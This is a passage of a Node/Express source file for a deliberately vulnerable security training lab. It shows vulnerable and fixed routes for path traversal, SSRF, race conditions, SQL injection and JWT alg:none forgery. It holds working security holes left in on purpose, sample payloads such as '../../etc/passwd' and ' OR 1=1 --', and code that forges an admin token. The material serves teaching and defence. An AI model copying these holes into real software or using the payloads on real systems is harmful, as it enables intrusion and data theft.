    <p><a href="/">Back to labs</a> | <a href="/ssti">Try again</a></p>
    <p>Input: <code>${escapeHtml(name)}</code></p>
    <h3>Output</h3>
    ${error
      ? `<pre style="color:red;">${escapeHtml(error)}</pre>`
      : `<pre ${PRE}>${escapeHtml(result)}</pre>`}
    ${!error && result !== `Hello, ${name}!` ? '<p style="color:red;font-weight:bold;">&#9888; Template expression was evaluated! The server executed your code.</p>' : ""}
  `);
});

app.get("/ssti-fixed", (req, res) => {
  res.type("html").send(`
    <h1>Lab 22b: SSTI — String Concatenation (Fixed)</h1>
    <p><a href="/">Back to labs</a></p>
    <form method="post">
      <label>Name: <input name="name" value="World" size="40"></label>
      <button type="submit">Greet</button>
    </form>
    <p>Try <code>&#36;{7*7}</code> — it will be treated as literal text.</p>
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// Fixed: plain string concatenation — no eval()</span>
<span style="background:#1a3a1a;color:#89d185;font-weight:bold;">const result = "Hello, " + escapeHtml(name) + "!";</span>  <span style="color:#6a9955;">// &lt;-- THE FIX</span>

<span style="color:#6a9955;">// No template interpretation — &#36;{...} is treated as literal text.</span>
<span style="color:#6a9955;">// Input is also HTML-escaped to prevent XSS.</span></code></pre>
  `);
});

app.post("/ssti-fixed", (req, res) => {
  const name = req.body.name || "World";
  const result = "Hello, " + escapeHtml(name) + "!";
  res.type("html").send(`
    <h1>Lab 22b: SSTI — Result (Fixed)</h1>
    <p><a href="/">Back to labs</a> | <a href="/ssti-fixed">Try again</a></p>
    <p>Input: <code>${escapeHtml(name)}</code></p>
    <h3>Output</h3>
    <pre ${PRE}>${escapeHtml(result)}</pre>
    <p style="color:green;">&#10004; Template expression was NOT evaluated — treated as plain text.</p>
  `);
});

/* ========================================================================
   LAB 27 — Path Traversal (CWE-22)
   ======================================================================== */
const fs = require("fs");
const path = require("path");
const SAFE_DIR = path.join(__dirname, "lab-files");

// Create sample files at startup
if (!fs.existsSync(SAFE_DIR)) fs.mkdirSync(SAFE_DIR, { recursive: true });
fs.writeFileSync(path.join(SAFE_DIR, "readme.txt"), "Welcome to the file viewer!\nThis is a safe sample file.\n");
fs.writeFileSync(path.join(SAFE_DIR, "report.csv"), "name,score,grade\nalice,95,A\nbob,87,B+\ncharlie,72,C\n");
fs.writeFileSync(path.join(SAFE_DIR, "notes.txt"), "Meeting notes from 2024-01-15:\n- Discussed security review\n- Action items assigned\n");

app.get("/path-traversal", (req, res) => {
  const file = req.query.file || "readme.txt";
  let content, error;
  try {
    content = fs.readFileSync(SAFE_DIR + "/" + file, "utf-8");
  } catch (e) {
    error = e.message;
  }
  const escaped = file.includes("..") || file.includes("/etc") || file.includes("server.js");

  res.type("html").send(`
    <h1>Lab 27a: Path Traversal (Vulnerable)</h1>
    <p><a href="/">Back to labs</a></p>
    <p>Available files: <a href="?file=readme.txt">readme.txt</a> | <a href="?file=report.csv">report.csv</a> | <a href="?file=notes.txt">notes.txt</a></p>
    <form method="get">
      <label>Filename: <input name="file" value="${escapeHtml(file)}" size="40"></label>
      <button type="submit">Read File</button>
    </form>
    <p style="color:#c00;">&#9888; Try: <code>?file=../server.js</code> or <code>?file=../package.json</code></p>
    <h3>File: ${escapeHtml(file)}</h3>
    ${error
      ? `<pre style="color:red;">${escapeHtml(error)}</pre>`
      : `<pre ${PRE}>${escapeHtml(content)}</pre>`}
    ${escaped ? '<p style="color:red;font-weight:bold;">&#9888; Path traversal! You escaped the safe directory.</p>' : ""}
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// Vulnerable: direct concatenation — ../ escapes the directory</span>
<span style="background:#5c1a1a;color:#f48771;font-weight:bold;">const content = fs.readFileSync(SAFE_DIR + "/" + file);</span>  <span style="color:#f44747;">// &lt;-- THE BUG</span>

<span style="color:#6a9955;">// Input: "../../etc/passwd"</span>
<span style="color:#6a9955;">// Path becomes: /app/lab-files/../../etc/passwd → /etc/passwd</span></code></pre>

    <h3>Attack Flow</h3>
    <ol>
      <li>App serves files from a safe directory using filename from query param</li>
      <li>Attacker uses <code>../</code> to escape the directory</li>
      <li>Server reads files outside the intended directory</li>
      <li>Attacker accesses source code, config files, <code>/etc/passwd</code>, etc.</li>
    </ol>
  `);
});

app.get("/path-traversal-fixed", (req, res) => {
  const file = req.query.file || "readme.txt";
  const resolved = path.resolve(SAFE_DIR, file);
  const isSafe = resolved.startsWith(SAFE_DIR + path.sep) || resolved === SAFE_DIR;
  let content, error;

  if (!isSafe) {
    error = "Access denied — path traversal blocked";
  } else {
    try {
      content = fs.readFileSync(resolved, "utf-8");
    } catch (e) {
      error = "File not found";
    }
  }

  res.type("html").send(`
    <h1>Lab 27b: Path Traversal — Resolved Path Check (Fixed)</h1>
    <p><a href="/">Back to labs</a></p>
    <p>Available files: <a href="?file=readme.txt">readme.txt</a> | <a href="?file=report.csv">report.csv</a> | <a href="?file=notes.txt">notes.txt</a></p>
    <form method="get">
      <label>Filename: <input name="file" value="${escapeHtml(file)}" size="40"></label>
      <button type="submit">Read File</button>
    </form>
    <p>Try <code>?file=../server.js</code> — it will be blocked.</p>

    <h3>File: ${escapeHtml(file)}</h3>
    <p>Resolved path: <code>${escapeHtml(resolved)}</code></p>
    <p>Starts with safe dir: <code>${isSafe ? "Yes &#10004;" : "No &#10060;"}</code></p>
    ${error
      ? `<p style="color:${isSafe ? "orange" : "green"};font-weight:bold;">${isSafe ? "&#9888;" : "&#10004;"} ${escapeHtml(error)}</p>`
      : `<pre ${PRE}>${escapeHtml(content)}</pre>`}
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// Fixed: resolve the full path and verify it's within the safe directory</span>
<span style="color:#9cdcfe;">const</span> resolved = path.<span style="color:#dcdcaa;">resolve</span>(SAFE_DIR, file);
<span style="background:#1a3a1a;color:#89d185;font-weight:bold;">if (!resolved.startsWith(SAFE_DIR + path.sep)) {</span>  <span style="color:#6a9955;">// &lt;-- THE FIX</span>
  <span style="color:#c586c0;">return</span> res.status(403).send(<span style="color:#ce9178;">"Access denied"</span>);
}
<span style="color:#9cdcfe;">const</span> content = fs.<span style="color:#dcdcaa;">readFileSync</span>(resolved);</code></pre>

    <details>
      <summary>How does this fix it?</summary>
      <p><code>path.resolve()</code> normalizes <code>../</code> sequences into an absolute
      path. Then we check if the result <strong>starts with</strong> the safe directory.
      If the resolved path escapes the directory, the request is denied.</p>
    </details>
  `);
});

/* ========================================================================
   LAB 28 — SSRF (CWE-918)
   ======================================================================== */
app.use("/ssrf", express.urlencoded({ extended: true }));
app.use("/ssrf-fixed", express.urlencoded({ extended: true }));

// Simulated internal API
app.get("/admin-internal", (req, res) => {
  res.json({
    secret: "internal-api-key-abc123",
    dbPassword: "p@ssw0rd_pr0duction",
    internalNote: "This endpoint should never be accessible from the public internet",
  });
});

app.get("/ssrf", (req, res) => {
  res.type("html").send(`
    <h1>Lab 28a: SSRF — Server-Side Request Forgery (Vulnerable)</h1>
    <p><a href="/">Back to labs</a></p>
    <p>Enter a URL to fetch:</p>
    <form method="post">
      <label>URL: <input name="url" value="http://example.com" size="50"></label>
      <button type="submit">Fetch</button>
    </form>
    <p style="color:#c00;">&#9888; Try: <code>http://localhost:3000/admin-internal</code></p>
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// Vulnerable: server fetches any URL the user provides</span>
<span style="background:#5c1a1a;color:#f48771;font-weight:bold;">const response = await fetch(userUrl);</span>  <span style="color:#f44747;">// &lt;-- THE BUG</span>

<span style="color:#6a9955;">// The server can reach internal services that the user cannot.</span>
<span style="color:#6a9955;">// Attacker uses the server as a proxy to access:</span>
<span style="color:#6a9955;">// - localhost services (admin panels, APIs)</span>
<span style="color:#6a9955;">// - Internal network (10.x, 192.168.x, 169.254.x)</span>
<span style="color:#6a9955;">// - Cloud metadata (169.254.169.254)</span></code></pre>

    <h3>Attack Flow</h3>
    <ol>
      <li>App has a "URL preview" or "webhook" feature that fetches URLs</li>
      <li>Attacker provides <code>http://localhost:3000/admin-internal</code></li>
      <li>Server fetches the URL from its own network context</li>
      <li>Internal API responds with secrets — attacker reads the response</li>
    </ol>
  `);
});

app.post("/ssrf", (req, res) => {
  const url = req.body.url || "";
  fetch(url, { signal: AbortSignal.timeout(5000) })
    .then(r => r.text())
    .then(body => {
      const isInternal = url.includes("localhost") || url.includes("127.0.0.1") || url.includes("admin-internal");
      res.type("html").send(`
        <h1>Lab 28a: SSRF — Result</h1>
        <p><a href="/">Back to labs</a> | <a href="/ssrf">Try again</a></p>
        <p>Fetched: <code>${escapeHtml(url)}</code></p>
        ${isInternal ? '<p style="color:red;font-weight:bold;">&#9888; SSRF! The server fetched an internal resource on your behalf.</p>' : ""}
        <h3>Response</h3>
        <pre ${PRE}>${escapeHtml(body.substring(0, 2000))}</pre>
      `);
    })
    .catch(err => {
      res.type("html").send(`
        <h1>Lab 28a: SSRF — Error</h1>
        <p><a href="/">Back to labs</a> | <a href="/ssrf">Try again</a></p>
        <p>Error fetching <code>${escapeHtml(url)}</code>: ${escapeHtml(err.message)}</p>
      `);
    });
});

app.get("/ssrf-fixed", (req, res) => {
  res.type("html").send(`
    <h1>Lab 28b: SSRF — URL Validation (Fixed)</h1>
    <p><a href="/">Back to labs</a></p>
    <form method="post">
      <label>URL: <input name="url" value="http://example.com" size="50"></label>
      <button type="submit">Fetch</button>
    </form>
    <p>Try <code>http://localhost:3000/admin-internal</code> — it will be blocked.</p>
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// Fixed: validate URL before fetching</span>
<span style="color:#9cdcfe;">const</span> parsed = <span style="color:#9cdcfe;">new</span> <span style="color:#4ec9b0;">URL</span>(userUrl);

<span style="color:#6a9955;">// Block private/internal IPs</span>
<span style="color:#9cdcfe;">const</span> blockedPatterns = [
  /^127\\./, /^10\\./, /^192\\.168\\./, /^172\\.(1[6-9]|2\\d|3[01])\\./,
  /^169\\.254\\./, /^0\\./, /^localhost$/i, /^\\[::1\\]$/
];
<span style="background:#1a3a1a;color:#89d185;font-weight:bold;">if (blockedPatterns.some(p =&gt; p.test(parsed.hostname))) {</span>  <span style="color:#6a9955;">// &lt;-- THE FIX</span>
  <span style="color:#c586c0;">return</span> res.status(403).send(<span style="color:#ce9178;">"Blocked: internal address"</span>);
}

<span style="color:#6a9955;">// Also enforce protocol allowlist</span>
<span style="color:#c586c0;">if</span> (![<span style="color:#ce9178;">"http:"</span>, <span style="color:#ce9178;">"https:"</span>].includes(parsed.protocol)) {
  <span style="color:#c586c0;">return</span> res.status(400).send(<span style="color:#ce9178;">"Only HTTP(S) allowed"</span>);
}</code></pre>

    <details>
      <summary>How does this fix it?</summary>
      <p>Before fetching, the server:</p>
      <ol>
        <li>Parses the URL to extract the hostname</li>
        <li>Blocks private IP ranges (127.x, 10.x, 192.168.x, 169.254.x, etc.)</li>
        <li>Blocks <code>localhost</code> and IPv6 loopback</li>
        <li>Only allows <code>http:</code> and <code>https:</code> protocols</li>
      </ol>
      <p><strong>Additional protections in production:</strong></p>
      <ul>
        <li>DNS resolution check (prevent DNS rebinding)</li>
        <li>Allowlist of permitted domains</li>
        <li>Disable redirects or re-validate after redirect</li>
      </ul>
    </details>
  `);
});

app.post("/ssrf-fixed", (req, res) => {
  const url = req.body.url || "";
  let parsed;
  try {
    parsed = new URL(url);
  } catch {
    return res.type("html").status(400).send(`
      <h1>Lab 28b: SSRF — Invalid URL</h1>
      <p><a href="/">Back to labs</a> | <a href="/ssrf-fixed">Try again</a></p>
      <p style="color:orange;">Invalid URL: <code>${escapeHtml(url)}</code></p>
    `);
  }

  if (!["http:", "https:"].includes(parsed.protocol)) {
    return res.type("html").status(400).send(`
      <h1>Lab 28b: SSRF — Blocked Protocol</h1>
      <p><a href="/">Back to labs</a> | <a href="/ssrf-fixed">Try again</a></p>
      <p style="color:green;">&#10004; Blocked: protocol <code>${escapeHtml(parsed.protocol)}</code> is not allowed.</p>
    `);
  }

  const blockedPatterns = [
    /^127\./, /^10\./, /^192\.168\./, /^172\.(1[6-9]|2\d|3[01])\./,
    /^169\.254\./, /^0\./, /^localhost$/i, /^\[::1\]$/,
  ];
  if (blockedPatterns.some(p => p.test(parsed.hostname))) {
    return res.type("html").status(403).send(`
      <h1>Lab 28b: SSRF — Blocked</h1>
      <p><a href="/">Back to labs</a> | <a href="/ssrf-fixed">Try again</a></p>
      <p style="color:green;font-weight:bold;">&#10004; SSRF blocked! <code>${escapeHtml(parsed.hostname)}</code> is a private/internal address.</p>
    `);
  }

  fetch(url, { signal: AbortSignal.timeout(5000) })
    .then(r => r.text())
    .then(body => {
      res.type("html").send(`
        <h1>Lab 28b: SSRF — Result (Fixed)</h1>
        <p><a href="/">Back to labs</a> | <a href="/ssrf-fixed">Try again</a></p>
        <p>Fetched: <code>${escapeHtml(url)}</code></p>
        <p style="color:green;">&#10004; URL passed validation — public address allowed.</p>
        <h3>Response</h3>
        <pre ${PRE}>${escapeHtml(body.substring(0, 2000))}</pre>
      `);
    })
    .catch(err => {
      res.type("html").send(`
        <h1>Lab 28b: SSRF — Error</h1>
        <p><a href="/">Back to labs</a> | <a href="/ssrf-fixed">Try again</a></p>
        <p>Error: ${escapeHtml(err.message)}</p>
      `);
    });
});

/* ========================================================================
   LAB 37 — Race Conditions (CWE-362)
   ======================================================================== */
let raceBalances = { alice: 1000 };
app.use("/race-condition", express.urlencoded({ extended: true }));
app.use("/race-condition-fixed", express.urlencoded({ extended: true }));

app.post("/race-condition/reset", (req, res) => {
  raceBalances = { alice: 1000 };
  res.json({ ok: true, balance: 1000 });
});

app.get("/race-condition", (req, res) => {
  res.type("html").send(`
    <h1>Lab 37a: Race Condition — TOCTOU (Vulnerable)</h1>
    <p><a href="/">Back to labs</a></p>
    <p>Alice has <strong>$${raceBalances.alice}</strong>. Transfer $800 — but what if 5 requests arrive simultaneously?</p>
    <button onclick="resetBalance()">Reset Balance to $1000</button>
    <button onclick="sendConcurrent()">Send 5 Concurrent $800 Transfers</button>
    <pre id="result" ${PRE}>Click a button above...</pre>
    <script>
      async function resetBalance() {
        await fetch("/race-condition/reset", { method: "POST" });
        document.getElementById("result").textContent = "Balance reset to $1000";
      }
      async function sendConcurrent() {
        document.getElementById("result").textContent = "Sending 5 concurrent requests...";
        const results = await Promise.all(
          Array.from({ length: 5 }, (_, i) =>
            fetch("/race-condition/transfer", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ amount: 800 }),
            }).then(r => r.json())
          )
        );
        document.getElementById("result").textContent =
          "Results:\\n" + results.map((r, i) => "Request " + (i+1) + ": " + JSON.stringify(r)).join("\\n");
      }
    </script>
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// Vulnerable: Time-Of-Check to Time-Of-Use (TOCTOU)</span>
<span style="color:#9cdcfe;">const</span> balance = getBalance(<span style="color:#ce9178;">"alice"</span>);  <span style="color:#6a9955;">// Read: $1000</span>
<span style="background:#5c1a1a;color:#f48771;font-weight:bold;">if (balance &gt;= amount) {</span>  <span style="color:#f44747;">// &lt;-- THE BUG (check)</span>
  <span style="color:#6a9955;">// ...slow DB write...</span>
  <span style="background:#5c1a1a;color:#f48771;font-weight:bold;">setBalance("alice", balance - amount);</span>  <span style="color:#f44747;">// &lt;-- (use, much later)</span>
}

<span style="color:#6a9955;">// 5 concurrent requests all read $1000, all pass the check,</span>
<span style="color:#6a9955;">// all deduct $800 → balance goes to -$3000!</span></code></pre>

    <h3>Attack Flow</h3>
    <ol>
      <li>Alice has $1000 in her account</li>
      <li>Attacker sends 5 simultaneous $800 transfer requests</li>
      <li>All 5 requests read balance as $1000 (before any writes)</li>
      <li>All 5 pass the <code>balance &gt;= 800</code> check</li>
      <li>All 5 deduct $800 → balance: $1000 - ($800 × 5) = <strong>-$3000</strong></li>
    </ol>
  `);
});

app.post("/race-condition/transfer", express.json(), (req, res) => {
  const amount = Number(req.body.amount) || 0;
  const balance = raceBalances.alice;
  if (balance >= amount) {
    // Simulate slow DB write
    setTimeout(() => {
      raceBalances.alice = balance - amount;
      res.json({ success: true, oldBalance: balance, newBalance: raceBalances.alice, deducted: amount });
    }, 100);
  } else {
    res.json({ success: false, message: "Insufficient funds", balance });
  }
});

// Mutex for the fixed version
let raceLock = false;
const raceLockQueue = [];

function acquireLock() {
  return new Promise(resolve => {
    if (!raceLock) { raceLock = true; resolve(); }
    else raceLockQueue.push(resolve);
  });
}

function releaseLock() {
  if (raceLockQueue.length > 0) {
    const next = raceLockQueue.shift();
    next();
  } else {
    raceLock = false;
  }
}

app.get("/race-condition-fixed", (req, res) => {
  res.type("html").send(`
    <h1>Lab 37b: Race Condition — Mutex Lock (Fixed)</h1>
    <p><a href="/">Back to labs</a></p>
    <p>Alice has <strong>$${raceBalances.alice}</strong>. Same 5 concurrent transfers, but with a lock.</p>
    <button onclick="resetBalance()">Reset Balance to $1000</button>
    <button onclick="sendConcurrent()">Send 5 Concurrent $800 Transfers</button>
    <pre id="result" ${PRE}>Click a button above...</pre>
    <script>
      async function resetBalance() {
        await fetch("/race-condition/reset", { method: "POST" });
        document.getElementById("result").textContent = "Balance reset to $1000";
      }
      async function sendConcurrent() {
        document.getElementById("result").textContent = "Sending 5 concurrent requests...";
        const results = await Promise.all(
          Array.from({ length: 5 }, (_, i) =>
            fetch("/race-condition-fixed/transfer", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ amount: 800 }),
            }).then(r => r.json())
          )
        );
        document.getElementById("result").textContent =
          "Results:\\n" + results.map((r, i) => "Request " + (i+1) + ": " + JSON.stringify(r)).join("\\n");
      }
    </script>
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// Fixed: mutex serializes access to the shared resource</span>
<span style="background:#1a3a1a;color:#89d185;font-weight:bold;">await acquireLock();</span>  <span style="color:#6a9955;">// &lt;-- THE FIX</span>
<span style="color:#c586c0;">try</span> {
  <span style="color:#9cdcfe;">const</span> balance = getBalance(<span style="color:#ce9178;">"alice"</span>);
  <span style="color:#c586c0;">if</span> (balance &gt;= amount) {
    setBalance(<span style="color:#ce9178;">"alice"</span>, balance - amount);
  }
} <span style="color:#c586c0;">finally</span> {
  <span style="background:#1a3a1a;color:#89d185;font-weight:bold;">releaseLock();</span>  <span style="color:#6a9955;">// Always release, even on error</span>
}

<span style="color:#6a9955;">// Only one request can read+check+write at a time.</span>
<span style="color:#6a9955;">// Request 1 succeeds ($1000→$200), requests 2-5 see $200 and fail.</span></code></pre>

    <details>
      <summary>How does this fix it?</summary>
      <p>A <strong>mutex (mutual exclusion) lock</strong> ensures that only one request
      can read-check-write at a time. Other requests wait in a queue.</p>
      <p><strong>In production, use:</strong></p>
      <ul>
        <li>Database transactions with <code>SELECT ... FOR UPDATE</code></li>
        <li>Optimistic locking with version columns</li>
        <li>Redis distributed locks (Redlock) for multi-server</li>
        <li>Atomic operations: <code>UPDATE accounts SET balance = balance - 800 WHERE balance &gt;= 800</code></li>
      </ul>
    </details>
  `);
});

app.post("/race-condition-fixed/transfer", express.json(), async (req, res) => {
  const amount = Number(req.body.amount) || 0;
  await acquireLock();
  try {
    const balance = raceBalances.alice;
    if (balance >= amount) {
      // Simulate slow DB write
      await new Promise(r => setTimeout(r, 100));
      raceBalances.alice = balance - amount;
      res.json({ success: true, oldBalance: balance, newBalance: raceBalances.alice, deducted: amount });
    } else {
      res.json({ success: false, message: "Insufficient funds", balance });
    }
  } finally {
    releaseLock();
  }
});

/* ========================================================================
   LAB 20 — SQL Injection (CWE-89)
   ======================================================================== */
let Database, db;
try {
  Database = require("better-sqlite3");
  db = new Database(":memory:");
  db.exec(`
    CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT, role TEXT);
    INSERT INTO users VALUES (1, 'alice', 'password123', 'user');
    INSERT INTO users VALUES (2, 'bob', 'hunter2', 'user');
    INSERT INTO users VALUES (3, 'admin', 'sup3rs3cret', 'admin');
  `);
} catch (e) {
  db = null;
}

app.use("/sqli", express.urlencoded({ extended: true }));
app.use("/sqli-fixed", express.urlencoded({ extended: true }));

app.get("/sqli", (req, res) => {
  if (!db) return res.type("html").send(`<h1>Lab 20: SQL Injection</h1><p>Install <code>better-sqlite3</code>: <code>npm install better-sqlite3</code></p><p><a href="/">Back</a></p>`);
  res.type("html").send(`
    <h1>Lab 20a: SQL Injection (Vulnerable)</h1>
    <p><a href="/">Back to labs</a></p>
    <p>Login to view your profile:</p>
    <form method="post">
      <label>Username: <input name="username" value="alice" size="30"></label><br><br>
      <button type="submit">Login</button>
    </form>
    <p style="color:#c00;">&#9888; Try: <code>' OR 1=1 --</code></p>
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// Vulnerable: string concatenation builds SQL query</span>
<span style="color:#9cdcfe;">const</span> query = <span style="color:#ce9178;">"SELECT * FROM users WHERE username='"</span> + username + <span style="color:#ce9178;">"'"</span>;
<span style="background:#5c1a1a;color:#f48771;font-weight:bold;">const rows = db.prepare(query).all();</span>  <span style="color:#f44747;">// &lt;-- THE BUG</span>

<span style="color:#6a9955;">// Input: ' OR 1=1 --</span>
<span style="color:#6a9955;">// Query becomes: SELECT * FROM users WHERE username='' OR 1=1 --'</span>
<span style="color:#6a9955;">// OR 1=1 is always true → returns ALL rows</span>
<span style="color:#6a9955;">// -- comments out the rest of the query</span></code></pre>

    <h3>Attack Flow</h3>
    <ol>
      <li>App builds SQL query with string concatenation</li>
      <li>Attacker enters <code>' OR 1=1 --</code> as username</li>
      <li>The <code>'</code> closes the string literal in SQL</li>
      <li><code>OR 1=1</code> makes the WHERE clause always true</li>
      <li><code>--</code> comments out the trailing <code>'</code></li>
      <li>Database returns ALL users — including passwords and admin accounts</li>
    </ol>
  `);
});

app.post("/sqli", (req, res) => {
  if (!db) return res.status(500).send("SQLite not available");
  const username = req.body.username || "";
  const query = "SELECT * FROM users WHERE username='" + username + "'";
  let rows, error;
  try {
    rows = db.prepare(query).all();
  } catch (e) {
    error = e.message;
  }

  res.type("html").send(`
    <h1>Lab 20a: SQL Injection — Result</h1>
    <p><a href="/">Back to labs</a> | <a href="/sqli">Try again</a></p>
    <p>Query: <code>${escapeHtml(query)}</code></p>
    ${error ? `<pre style="color:red;">${escapeHtml(error)}</pre>` : ""}
    ${rows && rows.length > 0 ? `
      ${rows.length > 1 ? '<p style="color:red;font-weight:bold;">&#9888; SQL Injection! Query returned ' + rows.length + ' rows instead of 1.</p>' : ""}
      <table border="1" cellpadding="8" style="border-collapse:collapse;">
        <tr><th>ID</th><th>Username</th><th>Password</th><th>Role</th></tr>
        ${rows.map(r => `<tr><td>${r.id}</td><td>${escapeHtml(r.username)}</td><td>${escapeHtml(r.password)}</td><td>${escapeHtml(r.role)}</td></tr>`).join("")}
      </table>
    ` : "<p>No results.</p>"}
  `);
});

app.get("/sqli-fixed", (req, res) => {
  if (!db) return res.type("html").send(`<h1>Lab 20: SQL Injection</h1><p>Install <code>better-sqlite3</code></p><p><a href="/">Back</a></p>`);
  res.type("html").send(`
    <h1>Lab 20b: SQL Injection — Parameterized Query (Fixed)</h1>
    <p><a href="/">Back to labs</a></p>
    <form method="post">
      <label>Username: <input name="username" value="alice" size="30"></label><br><br>
      <button type="submit">Login</button>
    </form>
    <p>Try <code>' OR 1=1 --</code> — it will be treated as a literal string.</p>
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// Fixed: parameterized query — user input is never part of SQL syntax</span>
<span style="background:#1a3a1a;color:#89d185;font-weight:bold;">const row = db.prepare("SELECT * FROM users WHERE username=?").get(username);</span>  <span style="color:#6a9955;">// &lt;-- THE FIX</span>

<span style="color:#6a9955;">// The ? placeholder separates SQL structure from data.</span>
<span style="color:#6a9955;">// The database engine handles escaping — no injection possible.</span>
<span style="color:#6a9955;">// Input "' OR 1=1 --" is searched as a literal username string.</span></code></pre>

    <details>
      <summary>How does this fix it?</summary>
      <p><strong>Parameterized queries</strong> (also called prepared statements) separate
      the SQL structure from the data. The database engine treats the parameter value as
      a literal string — it can never become part of the SQL syntax.</p>
      <p><strong>Rules:</strong></p>
      <ul>
        <li>Always use <code>?</code> placeholders (or named parameters like <code>:name</code>)</li>
        <li>Never concatenate user input into SQL strings</li>
        <li>This applies to all SQL databases (MySQL, PostgreSQL, SQLite, etc.)</li>
        <li>ORMs (Sequelize, Prisma, etc.) use parameterized queries internally</li>
      </ul>
    </details>
  `);
});

app.post("/sqli-fixed", (req, res) => {
  if (!db) return res.status(500).send("SQLite not available");
  const username = req.body.username || "";
  const row = db.prepare("SELECT * FROM users WHERE username=?").get(username);

  res.type("html").send(`
    <h1>Lab 20b: SQL Injection — Result (Fixed)</h1>
    <p><a href="/">Back to labs</a> | <a href="/sqli-fixed">Try again</a></p>
    <p>Parameterized query with value: <code>${escapeHtml(username)}</code></p>
    ${row ? `
      <p style="color:green;">&#10004; Found exactly 1 user.</p>
      <table border="1" cellpadding="8" style="border-collapse:collapse;">
        <tr><th>ID</th><th>Username</th><th>Role</th></tr>
        <tr><td>${row.id}</td><td>${escapeHtml(row.username)}</td><td>${escapeHtml(row.role)}</td></tr>
      </table>
      <p><em>Note: password is not returned in the fixed version.</em></p>
    ` : `<p>No user found with username <code>${escapeHtml(username)}</code>.</p>
         <p style="color:green;">&#10004; SQL injection payload was treated as a literal string — no results.</p>`}
  `);
});

/* ========================================================================
   LAB 26 — JWT Weaknesses (CWE-347)
   ======================================================================== */
let jwt;
try {
  jwt = require("jsonwebtoken");
} catch (e) {
  jwt = null;
}

const JWT_SECRET = "super-secret-key-123";
app.use("/jwt-demo", express.urlencoded({ extended: true }));
app.use("/jwt-verify", express.urlencoded({ extended: true }));
app.use("/jwt-verify-fixed", express.urlencoded({ extended: true }));

app.get("/jwt-demo", (req, res) => {
  if (!jwt) return res.type("html").send(`<h1>Lab 26: JWT</h1><p>Install: <code>npm install jsonwebtoken</code></p><p><a href="/">Back</a></p>`);

  const userToken = jwt.sign({ sub: "alice", role: "user" }, JWT_SECRET, { algorithm: "HS256" });
  const parts = userToken.split(".");
  const header = Buffer.from(parts[0], "base64url").toString();
  const payload = Buffer.from(parts[1], "base64url").toString();

  // Create a "none" algorithm token
  const noneHeader = Buffer.from(JSON.stringify({ alg: "none", typ: "JWT" })).toString("base64url");
  const adminPayload = Buffer.from(JSON.stringify({ sub: "admin", role: "admin" })).toString("base64url");
  const noneToken = noneHeader + "." + adminPayload + ".";

  res.type("html").send(`
    <h1>Lab 26: JWT Weaknesses (CWE-347)</h1>
    <p><a href="/">Back to labs</a></p>

    <h3>Legitimate Token (HS256)</h3>
    <pre ${PRE} style="word-break:break-all;">${escapeHtml(userToken)}</pre>
    <p>Header: <code>${escapeHtml(header)}</code></p>
    <p>Payload: <code>${escapeHtml(payload)}</code></p>

    <h3>Forged Token (alg: "none")</h3>
    <pre ${PRE} style="word-break:break-all;">${escapeHtml(noneToken)}</pre>
    <p>This token claims to be admin with <code>alg: "none"</code> (no signature).</p>

    <h3>Test Verification</h3>
    <form method="post" action="/jwt-verify">
      <label>Token: <textarea name="token" rows="3" cols="60">${escapeHtml(noneToken)}</textarea></label><br><br>
      <button type="submit" style="background:#c00;color:white;padding:8px 16px;border:none;border-radius:4px;">Verify (Vulnerable)</button>
    </form>
    <br>
    <form method="post" action="/jwt-verify-fixed">
      <label>Token: <textarea name="token" rows="3" cols="60">${escapeHtml(noneToken)}</textarea></label><br><br>
      <button type="submit" style="background:#070;color:white;padding:8px 16px;border:none;border-radius:4px;">Verify (Fixed)</button>
    </form>
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// Vulnerable: accepts alg:"none" — no signature verification</span>
<span style="background:#5c1a1a;color:#f48771;font-weight:bold;">jwt.verify(token, secret, { algorithms: ["HS256", "none"] });</span>  <span style="color:#f44747;">// &lt;-- THE BUG</span>

<span style="color:#6a9955;">// Fixed: only accept HS256</span>
<span style="background:#1a3a1a;color:#89d185;font-weight:bold;">jwt.verify(token, secret, { algorithms: ["HS256"] });</span>  <span style="color:#6a9955;">// &lt;-- THE FIX</span></code></pre>

    <h3>Attack Flow</h3>
    <ol>
      <li>Attacker decodes the JWT and changes the payload to <code>{"role":"admin"}</code></li>
      <li>Sets the header to <code>{"alg":"none"}</code></li>
      <li>Strips the signature (third part is empty)</li>
      <li>Vulnerable server accepts the token — no signature check with <code>alg: none</code></li>
    </ol>

    <details>
      <summary>Why is this dangerous?</summary>
      <p>The <code>none</code> algorithm means "no signature required." If the server
      accepts it, any attacker can forge tokens with arbitrary claims (admin role, etc.)
      without knowing the secret key.</p>
      <p><strong>Other JWT attacks:</strong></p>
      <ul>
        <li>Algorithm confusion: RS256 → HS256 (use public key as HMAC secret)</li>
        <li>Weak secrets: brute-force short/common secrets</li>
        <li>Missing expiration: tokens valid forever</li>
        <li>No audience/issuer validation</li>
      </ul>
    </details>
  `);
});

app.post("/jwt-verify", (req, res) => {
  if (!jwt) return res.status(500).send("jsonwebtoken not installed");
  const token = (req.body.token || "").trim();
  let decoded, error;
  try {
    // Vulnerable: accepts "none" algorithm
    decoded = jwt.verify(token, JWT_SECRET, { algorithms: ["HS256", "none"] });
  } catch (e) {
    error = e.message;
  }
  res.type("html").send(`
    <h1>Lab 26: JWT Verify — Vulnerable</h1>
    <p><a href="/">Back to labs</a> | <a href="/jwt-demo">Back to JWT lab</a></p>
    ${error
      ? `<p style="color:red;">Verification failed: ${escapeHtml(error)}</p>`
      : `<p style="color:red;font-weight:bold;">&#9888; Token accepted!</p>
